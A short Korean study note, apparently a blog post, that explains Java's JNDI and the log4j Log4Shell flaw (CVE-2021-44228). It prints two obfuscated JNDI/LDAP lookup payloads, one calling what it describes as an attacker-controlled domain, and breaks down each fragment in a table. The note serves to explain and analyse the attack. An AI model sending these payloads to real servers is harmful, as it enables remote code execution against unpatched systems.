## 🙎‍♀️JNDI(Java Naming and Directory Interface)
디렉터리 서비스(LDAP, DNS, NIS, 파일 시스템)를 발견하고 Lookup을 통해 디렉터리 Object를 Naming 해주는 Java API이다. 
Naming을 사용할 때 ${protocol:value}와 같은 형식. 

---
### log4j의 JNDI lookup 취약점(CVE-2021-44228)
 
```
${:-y$}{${afw:-jndi:}${afw:-ldap:}/${-}/${sys${-}:os.arch}.xxxx...xyz}
```

✔ “특정 서버에서 log4j 를 사용한 로그 처리를 하고 있다면, 로그를 남기는 순간 JNDI 요청이 트리거돼 외부 LDAP/HTTP 서버로 접속하도록 유도하는 공격

```
${:-y}${${afw:-jndi:}${afw:-ldap:}/${-}/${sys${-}:os.arch}.3749078c.getadgroup.og9o323vb6j449j29i033050788qn833b.109313.xyz}
```

여기서 사용된 패턴들은 다음과 같은 log4j 특성 활용:

| 페이로드 조각              | 의미                        |
| -------------------- | ------------------------- |
| `${:-y}`             | 변수가 없으면 y 반환 → 문자열 연결용    |
| `${afw:-jndi:}`      | 변수 `afw` 없으면 `jndi:` 사용   |
| `${afw:-ldap:}`      | 변수 없으면 `ldap:` 사용         |
| `${sys${-}:os.arch}` | 시스템 property `os.arch` 참조 |
| `/…3749…xyz`         | 공격자가 제어하는 원격 서버 domain    |

즉, **반드시 JNDI Lookup URL을 조합하려는 의도**가 있고, 대상 서버가 log4j 2.x 취약 버전을 사용하면 외부 LDAP 서버로 접속하여 악성 객체를 로드하도록 시도하는 구조임.


### 🔍 이 페이로드가 유효한가?

#### ✔ "log4j 2.0 ~ 2.14.1"

에서 JNDI Lookup 이 살아있고,
해당 파라미터가 **로그 메시지로 기록되기만 해도**
**JNDI Lookup → 외부서버 요청 → RCE 흐름**이 가능함.

---
